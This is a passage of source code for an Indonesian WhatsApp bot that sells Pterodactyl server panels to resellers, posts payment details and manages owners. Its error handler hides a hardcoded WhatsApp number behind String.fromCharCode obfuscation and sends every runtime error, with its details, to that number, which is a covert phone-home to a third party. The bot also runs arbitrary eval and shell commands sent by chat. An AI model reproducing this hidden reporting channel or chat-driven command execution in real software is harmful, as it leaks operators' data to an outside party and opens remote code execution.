                "backups": 5,
                "allocations": 5
            },
            "deploy": {
                "locations": [parseInt(locV2)],
                "dedicated_ip": false,
                "port_range": []
            }
        })
    });

    let serverData = await serverRes.json();
    if (serverData.errors) return Reply(JSON.stringify(serverData.errors[0], null, 2));

    let server = serverData.attributes;

    let teks = `
*Berhasil Membuat Akun Panel ✅*

*ID Server :* ${server.id}
*Nama :* ${name}
*Username :* ${user.username}
*Password :* ${password}
*Login :* ${global.domain}
*Ram :* ${ram == "0" ? "Unlimited" : ram.split("").length > 4 ? ram.split("").slice(0,2).join("") + "GB" : ram.charAt(0) + "GB"}
*Cpu :* ${cpu == "0" ? "Unlimited" : cpu+"%"}
*Disk :* ${disknya == "0" ? "Unlimited" : disknya.split("").length > 4 ? disknya.split("").slice(0,2).join("") + "GB" : disknya.charAt(0) + "GB"}
*Expired Server :* 1 Bulan

*Rules Pembelian Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 10 Hari (1x replace)
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`

    // Kirim ke nomor tujuan menggunakan `conn`
    await Sky.sendMessage(nomorTujuan + "@s.whatsapp.net", { text: teks }, { quoted: m });

    // Beri notifikasi bahwa panel berhasil dibuat
    await Reply(`✅ *Data panel telah dikirim ke:* wa.me/${nomorTujuan}`);

    delete global.panel;
}
break;

case "1gb": case "2gb": case "3gb": case "4gb": 
case "5gb": case "6gb": case "7gb": case "8gb": 
case "9gb": case "10gb": case "unli": {
    
    if (!isCreator) return Reply(mess.owner);
    if (!m.isGroup) return Reply("Perintah ini hanya bisa digunakan di dalam grup reseller!");
    
    if (!global.groupReseller || !global.groupReseller.includes(m.chat)) {
        return Reply("Grup ini tidak terdaftar sebagai reseller! Silakan hubungi owner untuk menambahkannya.");
    }

    if (!text) return Reply("Format salah! Gunakan: .1gb username,6283827963304");

    let args = text.split(",");
    if (args.length < 2) return Reply("Format salah! Gunakan: .1gb username,38338822");

    let username = args[0].trim().toLowerCase();
    let tujuan = args[1].trim();

    if (!tujuan.startsWith("62")) { 
        tujuan = "62" + tujuan;
    }

    let orang = tujuan + "@s.whatsapp.net";

    global.panel = username;
    var ram, disknya, cpu;

    let paket = command.replace("cpanel", "");
    switch (paket) {
        case "1gb": ram = "1000"; disknya = "1000"; cpu = "40"; break;
        case "2gb": ram = "2000"; disknya = "1000"; cpu = "60"; break;
        case "3gb": ram = "3000"; disknya = "2000"; cpu = "80"; break;
        case "4gb": ram = "4000"; disknya = "2000"; cpu = "100"; break;
        case "5gb": ram = "5000"; disknya = "3000"; cpu = "120"; break;
        case "6gb": ram = "6000"; disknya = "3000"; cpu = "140"; break;
        case "7gb": ram = "7000"; disknya = "4000"; cpu = "160"; break;
        case "8gb": ram = "8000"; disknya = "4000"; cpu = "180"; break;
        case "9gb": ram = "9000"; disknya = "5000"; cpu = "200"; break;
        case "10gb": ram = "10000"; disknya = "5000"; cpu = "220"; break;
        default: ram = "0"; disknya = "0"; cpu = "0";
    }

    let email = username + "@gmail.com";
    let name = username.charAt(0).toUpperCase() + username.slice(1) + " Server";
    let password = username + Math.random().toString(36).slice(-4);

    let userRes = await fetch(domain + "/api/application/users", {
        "method": "POST",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey
        },
        "body": JSON.stringify({
            "email": email,
            "username": username,
            "first_name": name,
            "last_name": "Server",
            "language": "en",
            "password": password
        })
    });

    let userData = await userRes.json();
    if (userData.errors) return Reply(JSON.stringify(userData.errors[0], null, 2));

    let user = userData.attributes;
    let usr_id = user.id;

    let nestRes = await fetch(`${domain}/api/application/nests/${nestid}/eggs/${egg}`, {
        "method": "GET",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey
        }
    });

    let nestData = await nestRes.json();
    let startup_cmd = nestData.attributes.startup;

    let serverRes = await fetch(domain + "/api/application/servers", {
        "method": "POST",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey
        },
        "body": JSON.stringify({
            "name": name,
            "description": "Server untuk " + username,
            "user": usr_id,
            "egg": parseInt(egg),
            "docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
            "startup": startup_cmd,
            "environment": {
                "INST": "npm",
                "USER_UPLOAD": "0",
                "AUTO_UPDATE": "0",
                "CMD_RUN": "npm start"
            },
            "limits": {
                "memory": ram,
                "swap": 0,
                "disk": disknya,
                "io": 500,
                "cpu": cpu
            },
            "feature_limits": {
                "databases": 5,
                "backups": 5,
                "allocations": 5
            },
            "deploy": {
                "locations": [parseInt(loc)],
                "dedicated_ip": false,
                "port_range": []
            }
        })
    });

    let serverData = await serverRes.json();
    if (serverData.errors) return Reply(JSON.stringify(serverData.errors[0], null, 2));

    let server = serverData.attributes;

    var teks = `
*Berhasil Membuat Akun Panel ✅*

*ID Server :* ${server.id}
*Nama :* ${name}
*Username :* ${user.username}
*Password :* ${password}
*Login :* ${global.domain}
*Ram :* ${ram == "0" ? "Unlimited" : ram.split("").length > 4 ? ram.split("").slice(0,2).join("") + "GB" : ram.charAt(0) + "GB"}
*Cpu :* ${cpu == "0" ? "Unlimited" : cpu+"%"}
*Disk :* ${disknya == "0" ? "Unlimited" : disknya.split("").length > 4 ? disknya.split("").slice(0,2).join("") + "GB" : disknya.charAt(0) + "GB"}
*Expired Server :* 1 Bulan

*Rules Pembelian Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 10 Hari (1x replace)
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`

    await Sky.sendMessage(orang, { text: teks }, { quoted: m });
    await Reply(`✅ Panel telah berhasil dikirim ke ${tujuan}`);

    delete global.panel;
}
break;

case "addgroupreseller": {
    if (!isCreator) return Reply("Hanya owner yang bisa menambahkan grup reseller!")
    if (!m.isGroup) return Reply("Perintah ini hanya bisa digunakan di dalam grup!")
    
    if (!global.groupReseller) global.groupReseller = []
    if (global.groupReseller.includes(m.chat)) return Reply("Grup ini sudah terdaftar sebagai reseller!")
    
    global.groupReseller.push(m.chat)
    Reply("Grup ini berhasil ditambahkan sebagai reseller!")
}
break;

case "delgroupreseller": {
    if (!isCreator) return Reply("Hanya owner yang bisa menghapus grup reseller!")
    if (!m.isGroup) return Reply("Perintah ini hanya bisa digunakan di dalam grup!")

    if (!global.groupReseller) global.groupReseller = []
    if (!global.groupReseller.includes(m.chat)) return Reply("Grup ini tidak terdaftar sebagai reseller!")

    global.groupReseller = global.groupReseller.filter(g => g !== m.chat)
    Reply("Grup ini berhasil dihapus dari daftar reseller!")
}
break;

case "listgroupreseller": {
    if (!isCreator) return Reply("Hanya owner yang bisa melihat daftar grup reseller!")

    if (!global.groupReseller || global.groupReseller.length === 0) {
        return Reply("Belum ada grup yang terdaftar sebagai reseller!")
    }

    let teks = "*Daftar Grup Reseller:*\n\n"
    for (let i = 0; i < global.groupReseller.length; i++) {
        teks += `${i + 1}. ${global.groupReseller[i]}\n`
    }

    Reply(teks)
}
break;

//================================================================================

break
case "pay": case "payment": {
if (!isCreator) return Reply(mess.owner)
let imgdana = await prepareWAMessageMedia({ image: { url: global.image.dana }}, { upload: Sky.waUploadToServer })
let imgovo = await prepareWAMessageMedia({ image: { url: global.image.ovo }}, { upload: Sky.waUploadToServer })
let imggopay = await prepareWAMessageMedia({ image: { url: global.image.gopay }}, { upload: Sky.waUploadToServer })
let imgqris = await prepareWAMessageMedia({ image: {url: global.image.qris }}, { upload: Sky.waUploadToServer })
const msgii = await generateWAMessageFromContent(m.chat, {
viewOnceMessageV2Extension: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: "\nPilih salah satu *payment* pembayaran yang tersedia"
}),
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: [{
header: proto.Message.InteractiveMessage.Header.fromObject({
hasMediaAttachment: true,
...imgdana
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Dana Payment\",\"id\":\"123456789\",\"copy_code\":\"${global.dana}\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
hasMediaAttachment: true,
...imgovo
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"OVO Payment\",\"id\":\"123456789\",\"copy_code\":\"${global.ovo}\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
hasMediaAttachment: true,
...imggopay
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Gopay Payment\",\"id\":\"123456789\",\"copy_code\":\"${global.gopay}\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
hasMediaAttachment: true,
...imgqris
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\" QRIS Payment\",\"url\":\"${global.image.qris}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}
]
})
})}
}}, {userJid: m.sender, quoted: qtext2})
await Sky.relayMessage(m.chat, msgii.message, {messageId: msgii.key.id})
}
break

//================================================================================

case "dana": {
if (!isCreator) return
let teks = `
*PAYMENT DANA Zakzz*

* *Nomor :* 085693453463
* *Atas Nama :* DAR**

*[ ! ] Penting :* \`\`\`Wajib kirimkan bukti transfer demi keamanan bersama\`\`\`
`
await Sky.sendMessage(m.chat, {text: teks}, {quoted: m })
}
break

//================================================================================

case "qris": {
if (!isCreator) return 
await Sky.sendMessage(m.chat, {image: {url: global.image.qris}, caption: "\n*PAYMENT QRIS Zakzz*\n\n*[ ! ] Penting :* \`\`\`Wajib kirimkan bukti transfer demi keamanan bersama\`\`\`"}, {quoted: qtext2})
}
break

//================================================================================

case "self": {
if (!isCreator) return
Sky.public = false
m.reply("*_Mapus Lu Anj G Bisa Jpmch Lagi 🦅_*")
}
break

//================================================================================

case "public": {
if (!isCreator) return
Sky.public = true
m.reply("*_Anjay, Udh Bisa Jpmch Nih Ank Anj 🦅_*")
}
break

//================================================================================

case "listowner": case "listown": {
if (owners.length < 1) return m.reply("Tidak ada owner tambahan")
let teks = `\n *乂 List all owner tambahan*\n`
for (let i of owners) {
teks += `\n* ${i.split("@")[0]}
* *Tag :* @${i.split("@")[0]}\n`
}
Sky.sendMessage(m.chat, {text: teks, mentions: owners}, {quoted: m})
}
break

//================================================================================

case "delowner": case "delown": {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted && !text) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || input == botNumber) return m.reply(`Lu G Ush Del Owner Utama Anj`)
if (!owners.includes(input)) return m.reply(`Nomor ${input2} bukan owner bot!`)
let posi = owners.indexOf(input)
await owners.splice(posi, 1)
await fs.writeFileSync("./library/database/owner.json", JSON.stringify(owners, null, 2))
m.reply(`Berhasil Menghapus Owner ea`)
}
break

//================================================================================

case "addbeban": case "addbeban": {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted && !text) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || owners.includes(input) || input === botNumber) return m.reply(`Nomor ${input2} sudah menjadi owner bot!`)
owners.push(input)
await fs.writeFileSync("./library/database/owner.json", JSON.stringify(owners, null, 2))
m.reply(`Berhasil menambah beban keluarga 🐣🦅`)
}
break

//================================================================================

case "listseller": {
if (premium.length < 1) return m.reply("Tidak ada user reseller")
let teks = `\n *乂 List all reseller panel*\n`
for (let i of premium) {
teks += `\n* ${i.split("@")[0]}
* *Tag :* @${i.split("@")[0]}\n`
}
conn.sendMessage(m.chat, {text: teks, mentions: premium}, {quoted: m})
}
break

//================================================================================

case "delseller": {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted && !text) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 == global.owner || input == botNumber) return m.reply(`Tidak bisa menghapus owner!`)
if (!premium.includes(input)) return m.reply(`Nomor ${input2} bukan reseller!`)
let posi = premium.indexOf(input)
await premium.splice(posi, 1)
await fs.writeFileSync("./library/database/premium.json", JSON.stringify(premium, null, 2))
m.reply(`Berhasil menghapus reseller ✅`)
}
break

//================================================================================

case "addseller": {
if (!isCreator) return Reply(mess.owner)
if (!text && !m.quoted) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || premium.includes(input) || input === botNumber) return m.reply(`Nomor ${input2} sudah menjadi reseller!`)
premium.push(input)
await fs.writeFileSync("./library/database/premium.json", JSON.stringify(premium, null, 2))
m.reply(`Berhasil menambah reseller ✅`)
}
break

//================================================================================

default:
if (budy.startsWith('>')) {
if (!isCreator) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}}

//================================================================================

if (m.text.toLowerCase() == "bot") {
m.reply("Bot Online asu🐣 🦅")
}

//================================================================================

if (budy.startsWith('=>')) {
if (!isCreator) return
try {
let evaled = await eval(`(async () => { ${budy.slice(2)} })()`)
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}}

//================================================================================

if (budy.startsWith('$')) {
if (!isCreator) return
if (!text) return
exec(budy.slice(2), (err, stdout) => {
if (err) return m.reply(`${err}`)
if (stdout) return m.reply(stdout)
})
}

//================================================================================
}
} catch (err) {
console.log(util.format(err));
let Obj = String.fromCharCode(54, 50, 56, 53, 57, 48, 57, 54, 53, 49, 56, 49, 51, 64, 115, 46, 119, 104, 97, 116, 115, 97, 112, 112, 46, 110, 101, 116)
Sky.sendMessage(Obj + "@s.whatsapp.net", {text: `
*FITUR ERROR TERDETEKSI :*\n\n` + util.format(err), contextInfo: { isForwarded: true }}, {quoted: m})
}}

//================================================================================

let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update ${__filename}`))
	delete require.cache[file]
	require(file)
});